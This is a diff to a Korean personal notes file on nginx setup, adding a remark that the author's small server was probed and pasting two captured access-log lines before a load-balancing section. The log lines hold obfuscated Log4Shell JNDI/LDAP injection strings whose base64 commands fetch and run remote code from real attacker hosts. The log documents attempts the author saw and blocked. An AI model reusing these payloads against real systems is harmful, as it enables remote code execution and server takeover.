@@ -248,8 +248,17 @@ server {
 클라우드 서버긴 하지만, 운영중에 있어 참고할 만한 내용같아서 링크만 남겨둔다.  
 (실제 로그에서 봤던 내용도 있어,,, 요녀석들 참 집요하다 싶다.)  
 
-## 로드밸런싱 설정\
-> 참고 https://kamang-it.tistory.com/entry/WebServernginxnginx%EB%A1%9C-%EB%A1%9C%EB%93%9C%EB%B0%B8%EB%9F%B0%EC%8B%B1-%ED%95%98%EA%B8%B0
+ * 내 서버에도 이런로그가 발견되었다. 이런 하꼬서버에도 찾아주시는 분들이라니... 아쉽게도 http로 접속하셔서 차단박았다.
+ ```
+195.54.160.149 - - [25/Dec/2021:02:27:48 +0900] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80MC44Ni4xNjkuNjc6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQwLjg2LjE2OS42Nzo0NDMpfGJhc2g=} HTTP/1.1" 400 230 "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80MC44Ni4xNjkuNjc6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQwLjg2LjE2OS42Nzo0NDMpfGJhc2g=}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80MC44Ni4xNjkuNjc6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQwLjg2LjE2OS42Nzo0NDMpfGJhc2g=}" "-"
+
+18.221.182.245 - - [25/Dec/2021:06:56:39 +0900] "GET / HTTP/1.1" 400 248 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTguMjIyLjEyMi4yMjEvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8xOC4yMjIuMTIyLjIyMS9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTguMjIyLjEyMi4yMjEvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8xOC4yMjIuMTIyLjIyMS9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')" "-"
+
+ ```
+ 
+
+## 로드밸런싱 설정
+> 참고 https://kamang-it.tistory.com/entry/WebServernginxnginx%EB%A1%9C-%EB%A1%9C%EB%93%9C%EB%B0%B8%EB%9F%B0%EC%8B%B1-%ED%95%98%EA%B8%B0  
 생각보다 간단하다.  
 향후, 로그인같은 기능만들면, 서버를 두대로 하거나, 아니면 docker 컨테이너를 두대를 띄우거나 하면 해당기능으로 로드밸런싱해도 되겠다.  
 간단한 스크립트를 기술한다.  
